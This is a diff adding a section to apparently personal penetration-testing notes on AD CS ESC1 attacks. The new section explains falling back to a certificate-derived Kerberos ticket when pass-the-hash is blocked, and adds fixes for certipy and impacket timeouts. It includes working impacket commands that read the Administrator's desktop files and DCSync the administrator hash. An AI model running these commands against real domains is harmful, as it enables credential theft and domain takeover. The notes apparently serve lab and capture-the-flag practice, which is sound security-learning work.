@@ -510,3 +510,33 @@ KRB5CCNAME=administrator.ccache secretsdump.py -k -no-pass \
 - [[active-directory-certificate-services]]
 - [[active-directory-golden-certificate]]
 - [[password-shadow-credentials]]
+
+## ESC1 gotcha: target blocks NTLM -> use the cert's own Kerberos ticket
+
+`certipy auth -pfx <victim>.pfx` (the PKINIT/UnPAC step after an ESC1/ESC9 request) yields **both** an
+NT hash **and** a TGT credential cache (`<victim>.ccache`). If the impersonated account is NTLM-hardened
+(member of **Protected Users**, or "this account may not use NTLM"), pass-the-hash returns
+`STATUS_ACCOUNT_RESTRICTION` and the NT hash is a dead end. The ccache still works, so pivot to Kerberos:
+
+```bash
+# read files / flags without exec (stealthy, no AV) - inline the ccache, one command:
+KRB5CCNAME=administrator.ccache impacket-smbclient -k -no-pass -dc-ip <DC_IP> <dc-fqdn>
+#   use C$ ; get Users\Administrator\Desktop\root.txt
+# or DCSync over Kerberos:
+KRB5CCNAME=administrator.ccache impacket-secretsdump -k -no-pass -dc-ip <DC_IP> -target-ip <DC_IP> -just-dc-user administrator <dc-fqdn>
+```
+
+The impersonated `Administrator` (RID 500) is a common Protected-Users target on lab DCs; do not grind the
+PtH, use the ccache you already have.
+
+### Tooling gotchas that mask a working ESC1
+- `certipy req` throwing `The NETBIOS connection with the remote host timed out` -> add `-target-ip <DC_IP>`
+  (RPC enrollment then hits the DC directly instead of via name resolution).
+- impacket Kerberos ops hanging with `[Errno 110] Connection timed out (REALM:88)` while certipy worked
+  seconds earlier = a **stale `/etc/hosts` realm line** from a prior box points the realm at a dead IP.
+  Remove the old `<realm> -> <ip>` line and always force `-dc-ip`/`-target-ip` so KDC/target resolution
+  never depends on DNS/hosts.
+
+See [[active-directory-certificate-esc-attacks]], [[pass-the-hash]], [[certipy]].
+
+<!-- promoted-slug: adcs-esc1-ntlm-restricted-kerberos -->
